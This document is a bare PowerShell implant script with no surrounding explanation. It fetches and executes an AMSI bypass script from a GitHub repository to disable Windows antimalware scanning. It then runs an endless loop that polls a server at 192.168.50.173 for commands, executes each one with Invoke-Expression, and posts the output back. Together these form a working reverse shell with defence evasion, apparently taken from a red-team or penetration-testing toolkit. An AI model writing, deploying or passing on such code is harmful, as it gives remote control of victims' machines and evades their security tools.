IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/amsi-bypass.ps1" -UseBasicParsing)
Start-Sleep -Milliseconds 500
# Define the subsequent script
$s = '192.168.50.173:443'
$i = '14f30f27-650c00d7-fef40df7'
$p = 'http://'
$v = IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization" = $i}
while ($true) {
    $c = (IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization" = $i})
    if ($c -ne 'None') {
        $r = IEX $c -ErrorAction Stop -ErrorVariable e
        $r = Out-String -InputObject $r
        $t = IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization" = $i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e + $r) -join ' ')
    }
    Start-Sleep -Seconds 0.8
}
